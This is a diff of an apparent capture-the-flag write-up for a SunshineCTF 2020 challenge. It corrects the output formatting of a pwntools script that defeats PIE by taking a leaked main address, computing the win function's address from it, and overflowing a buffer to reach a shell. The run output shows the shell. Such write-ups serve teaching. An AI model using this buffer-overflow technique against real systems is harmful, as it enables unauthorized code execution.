@@ -109,8 +109,8 @@ base = b'A' * 56
 io.recvline()
 io.sendline()
 main_add = io.recvline().replace(b"Yes I'm going to win: 0x", b"").replace(b"\n", b"")
-print("main address: 0x{}".format(main_add))
-print("win address: 0x{}".format(hex(int(main_add, 16) - 19)))
+print("main address: {}".format(hex(int(main_add, 16))))
+print("win address: {}".format(hex(int(main_add, 16) - 19)))
 payload = base + p64(int(main_add, 16) - 19)
 io.sendline(payload)
 io.interactive()
@@ -125,8 +125,8 @@ $ python pie.py
     NX:       NX enabled
     PIE:      PIE enabled
 [+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
-main address: 0xb'55907e18b76d'
-win address: 0x0x55907e18b75a
+main address: 0x55a613f1376d
+win address: 0x55a613f1375a
 [*] Switching to interactive mode
 $ ls
 chall_05
